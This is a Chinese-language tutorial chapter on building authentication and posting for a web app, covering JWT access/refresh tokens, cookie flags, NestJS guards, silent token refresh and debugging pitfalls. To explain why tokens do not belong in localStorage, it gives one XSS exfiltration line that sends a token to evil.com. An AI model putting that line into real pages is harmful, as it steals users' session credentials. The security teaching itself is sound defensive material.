# 阶段 5 · 认证与发帖

> 这是整个项目最"有分量"的一阶段。
> 别的模块写错是"功能不对"，认证写错是"所有人都能冒充任何人"。

---

## 一、验收清单

```bash
pnpm dev:api     # 终端 A
pnpm dev:web     # 终端 B
```

- [ ] 注册一个账号，成功后被自动登录
- [ ] 去 Mongo Atlas 控制台，`users` 集合里**看不到明文密码**，只有一串 `$2b$10$...`
- [ ] 退出登录，访问 `/posts/new` → **被重定向到登录页**，且地址带 `?redirect=/posts/new`
- [ ] 登录后自动跳回 `/posts/new`
- [ ] 发布一篇文章 → 跳到详情页，能看到自己的用户名是作者
- [ ] 再注册一个账号，尝试改/删**别人**的文章 → 得到 403
- [ ] 打开 DevTools → Application → Cookies，确认 `sp_refresh_token` 的 `HttpOnly` 是勾上的
- [ ] 在 Console 里执行 `document.cookie` → **看不到** `sp_refresh_token`
- [ ] 等 15 分钟（或把 `JWT_ACCESS_EXPIRES_IN` 改成 `20s` 重试），继续操作 → 应该**无感**地继续可用

> 最后一条是双 Token 方案存在的全部理由。如果它不成立，这套设计就白做了。

---

## 二、核心概念

### 1. 为什么不能把 Token 放进 localStorage

```ts
localStorage.setItem('token', accessToken)   // ❌ 看起来很方便
```

localStorage 里的东西，**同源下的任何 JavaScript 都能读**。
页面上只要有一处 XSS（哪怕来自某个第三方脚本），攻击者一行
`fetch('https://evil.com?t=' + localStorage.token)` 就把你的凭证拿走了。

而且更糟的是：Token 在有效期内**就是密码**。攻击者不需要知道你的密码。

### 2. 双 Token 的分工

| | 存哪 | 有效期 | 谁读得到 | 作用 |
| --- | --- | --- | --- | --- |
| Access Token | **内存**（JS 变量） | 15 分钟 | 你自己的代码 | 每个请求带上 |
| Refresh Token | **httpOnly Cookie** | 7 天 | **只有浏览器和后端** | 只用来换新 Access Token |

一句话概括这套设计的动机：

> **让高风险的凭证短命，让长命的凭证偷不走。**

Access Token 放在请求头里 —— 这意味着它**不会随跨站请求自动发送**，
天然免疫 CSRF。而 Refresh Token 自动携带，所以它必须靠
`SameSite` 来防 CSRF、靠 `httpOnly` 来防 XSS。

### 3. JWT 的一个关键事实

> **payload 可以被任何人解码阅读，但不能被伪造。**

它只是 Base64 编码（不是加密）。把 `sp_refresh_token` 的值粘到
<https://jwt.io> 上，你能直接看到 `sub`、`type`、`iat`、`exp`。

推论有两面：

- ✅ 可以放心用 payload 里的 `sub` 做身份识别 —— 它经过签名校验，是你自己签发的；
- ❌ 绝不能往 payload 里放敏感信息（密码、身份证号、手机号）。

### 4. 三种 Cookie 标志各防什么

```ts
res.cookie('sp_refresh_token', token, {
  httpOnly: true,        // 防 XSS：JavaScript 读不到
  sameSite: 'lax',       // 防 CSRF：跨站请求不自动携带
  secure: true,          // 防窃听：只在 HTTPS 上传输
  path: '/api/auth',     // 防过度暴露：只发给认证接口
})
```

`path` 那一条最容易被忽略。写成 `/` 的话，用户每次拉帖子列表、
每次加载图片，这个 Cookie 都会被带上 —— 虽然不会直接泄漏，
但它增加了被日志、代理、错误上报工具记录的机会。

### 5. 前端守卫不是安全边界

`app/middleware/auth.ts` 拦住了未登录用户访问发帖页。但你要清楚：

> **它拦的是"用户点进了一个自己不能用的页面"，不是攻击者。**

任何人都可以打开 DevTools 删掉中间件、或者直接用 curl 发请求。
真正的安全边界在后端的 `@UseGuards(JwtAuthGuard)`。

**前端的权限控制永远是体验优化，不是安全措施。** 这一条会贯穿你整个职业生涯。

### 6. 身份必须由服务端认定

阶段 3 留了两个临时字段 `authorId` / `authorUsername`，由客户端提交作者。
那意味着任何人伪造一下请求体就能**以别人的名义发帖**。

这一阶段把它们删掉了：

```ts
create(@CurrentUser() user: AuthenticatedUser, @Body() dto: CreatePostDto) {
  return this.postsService.create(dto, user)   // 作者来自 Token，不来自请求体
}
```

而且字段是被**删除**而不是"保留但忽略" —— 删除之后，
任何发送它的请求都会被全局管道的 `forbidNonWhitelisted` 直接 400 拒绝，
问题会立刻暴露，而不是被静默忽略。

---

## 三、代码走读

### `common/strategies/jwt.strategy.ts` —— 校验链路的中枢

```text
请求带着 Authorization: Bearer xxx 进来
        ▼
 JwtAuthGuard（只负责"拦"）
        ▼
 JwtStrategy（真正验证：取 Token → 验签名 → 验过期）
        ▼
 validate() 的返回值被挂到 request.user
        ▼
 业务代码通过 @CurrentUser() 拿到它
```

`validate()` 的返回值**就是"当前用户"的定义**。这里把 Token 里的
`sub` 映射成了更好读的 `id`，于是业务代码永远写 `user.id`，
不需要记住"JWT 标准声明叫 sub"。

### `modules/auth/auth.service.ts` —— 两个刻意的设计

**① 密钥每次显式传，不配全局默认值。**

```ts
JwtModule.register({})   // 空的！
```

因为本项目有两套密钥。配了默认值之后，就容易出现
"签 Refresh Token 时忘了传 secret，用了 Access 的密钥"——
**而且它不会报任何错**，双 Token 的保护却已经静默失效了。

> 一般原则：**当存在多个同类配置时，宁可每次显式指定，
> 也不要给一个"默认的那个"** —— 因为默认值会让人不再思考。

启动时还会自检两个密钥是否相同，相同就直接拒绝启动。

**② 登录失败的提示是模糊且一致的。**

"邮箱不存在"和"密码错误"返回**完全相同**的文案。
区分开来就等于给攻击者提供了一个**账号枚举**工具。

一个诚实的说明：这里的 `if (!user)` 是提前返回的，所以
"邮箱不存在"的响应明显更快，理论上仍可被**计时**推断。
完整的做法是给不存在的情况也算一次 bcrypt 来对齐耗时。
本项目为保持可读性没有做，但你要知道缺口在哪。

### `composables/useApi.ts` —— 401 静默续期

```ts
if (apiError.statusCode === 401 && allowRetry && !skipAuthRetry) {
  const refreshed = await useAuth().refresh()
  if (refreshed) return await request<T>(path, options, false)   // 只重试一次
}
```

三个细节都不可省：

- `skipAuthRetry`：否则"刷新令牌的请求自己收到 401"会无限递归；
- `allowRetry = false`：保证每个请求最多重试一次；
- 失败后不清空登录态就重试：会陷入死循环。

用户视角：什么都没有发生。没有这段逻辑，用户会每 15 分钟被踢回登录页 ——
而且是在他刚点下"发布"的那一刻。

### `composables/useAccessToken.ts` —— 为什么不放 useState / Pinia

因为这两个都会把状态**序列化进 SSR 的 HTML**（`window.__NUXT__`），
那和存 localStorage 的风险完全一样。

所以用最"土"的模块级变量，并且加了一行：

```ts
set: (value) => {
  if (import.meta.server) return   // 服务端绝不持有 Token
  accessToken = value
}
```

模块级变量在服务端是**被所有请求共享**的。如果 SSR 期间写入了一个
用户的 Token，下一个用户的请求就可能读到 —— 这是极其严重的数据串号。

> 能用代码保证的事，不要交给注释和记忆。

---

## 四、踩坑记录

### 坑 1 · 同一秒内签发的 Refresh Token 完全相同（单测发现的真实缺陷）

写了一条断言"新旧 Refresh Token 必须不同"，它**失败**了。

原因：**JWT 的 `iat` 只有秒级精度**。两次签发如果在同一秒内、
载荷相同、密钥相同，签出来就是**一模一样**的字符串。

后果很实际：**Refresh Token 轮换在同一秒内完全无效** ——
用户拿旧 Token 换回来的还是旧 Token，一个被盗的 Token 不会因为
真正用户刷新过一次而失效。

修复是给 Refresh Token 加一个随机的 `jti` 声明。那条断言被保留了，
谁哪天把 `jti` 去掉，测试会立刻报警。

> 这个 bug 靠"手动点一遍"是发现不了的。**它是断言写出来的。**

### 坑 2 · 删除字段导致 `OmitType` 编译失败

阶段 5 从 `CreatePostDto` 删掉两个作者字段后：

```text
TS2322: Type '"authorId"' is not assignable to type 'keyof CreatePostDto'
```

`UpdatePostDto` 里那个 `OmitType(CreatePostDto, ['authorId', ...])` 编译不过了。

**这正是"删除一个字段"的真实成本** —— 它不只是删一行，
而是所有引用它的地方都会跟着报错。

但**报错是好事**：TypeScript 把"改漏了"变成立刻可见的编译错误，
而不是等运行时才发现"为什么更新接口莫名其妙拒绝请求"。
这是选择静态类型语言最实际的回报。

### 坑 3 · 类名移出项目目录后，Tailwind 不再生成它（且不报错）

为了让前后端头像配色完全一致，我把色板从 `apps/web` 移到了
`packages/shared`。然后：

> Tailwind 4 的自动来源探测范围是**当前项目目录**。
> 移出去之后，`from-indigo-500` 这些类**不会被生成到 CSS 里**，
> 所有头像失去背景色 —— 而它**不报任何错**。

修复是在 `main.css` 里显式声明来源：

```css
@source '../../../../../packages/shared/src';
```

验证方式是**直接检查产物 CSS**里有没有这些类名，而不是"看着好像有颜色"。

> 这类"静默失效"是最难排查的一类问题。凡是依赖"工具自动发现"的机制，
> 一旦你把它依赖的东西挪到了默认范围之外，都要主动验证、不能靠感觉。

### 坑 4 · `clearCookie` 的 path 必须与写入时一致

登出时如果 `clearCookie` 的 `path` 和写入时不同，浏览器会认为
这是两个不同的 Cookie，只删掉一个不存在的，**登录态还留着**。

这是"登出没生效"最常见的原因。所以本项目的 path 抽成了常量
`REFRESH_COOKIE_PATH`，写入和清除共用同一个值。

### 坑 5 · 前后端跨域的 Cookie 策略会随部署方式变化

本地开发时前端 3001、后端 3000，都属于 `localhost`，
所以 `sameSite: 'lax'` 能正常工作。

但阶段 8 部署后，前端在 `vercel.app`、后端在 `onrender.com` ——
它们属于**不同站点**，`lax` 会直接拦下这个 Cookie。
那时必须改成 `none`，并且后端要跑在 HTTPS 上（否则浏览器丢弃它）。

所以这个值做成了可配置项 `COOKIE_SAME_SITE`，而不是写死。

---

## 五、自检清单

- [ ] 为什么 Access Token 放内存、Refresh Token 放 httpOnly Cookie？
- [ ] JWT 的 payload 为什么可以放用户 id，但不能放密码？
- [ ] `sameSite` 防的是什么？`httpOnly` 防的是什么？`secure` 防的是什么？
- [ ] 为什么登录失败时不能区分"邮箱不存在"和"密码错误"？
- [ ] 前端路由守卫为什么不算安全边界？
- [ ] `JwtModule.register({})` 为什么故意留空？
- [ ] 一个请求收到 401 后，前端最多重试几次？为什么？

---

## 六、术语表

| 术语 | 一句话解释 |
| --- | --- |
| JWT | 三段式令牌：头.载荷.签名，载荷可读、签名不可伪造 |
| 双 Token | Access 短命存内存，Refresh 长命存 httpOnly Cookie |
| httpOnly | Cookie 标志，让 JavaScript 读不到它 |
| SameSite | Cookie 标志，控制跨站请求是否自动携带 |
| CSRF | 跨站请求伪造：借用你的 Cookie 以你的身份发请求 |
| 账号枚举 | 通过错误信息差异推断哪些账号真实存在 |
| 轮换 rotation | 每次刷新都签发新 Refresh Token，让旧的失效 |
| `jti` | JWT 标准声明，Token 的唯一编号 |
| 守卫 Guard | NestJS 里决定"能不能进入这个接口"的组件 |
| 静默续期 | Access Token 过期后自动换新并重放原请求，用户无感 |

---

## 下一阶段预告

阶段 6 会做评论、点赞和标签筛选。表面上是三个小功能，
但里面藏着两个经典难题：**并发下的计数一致性**，以及
**关系型数据该内嵌还是拆表**。

去做 [练习 5](/exercises/stage-5) 之前，先把自检清单答一遍。
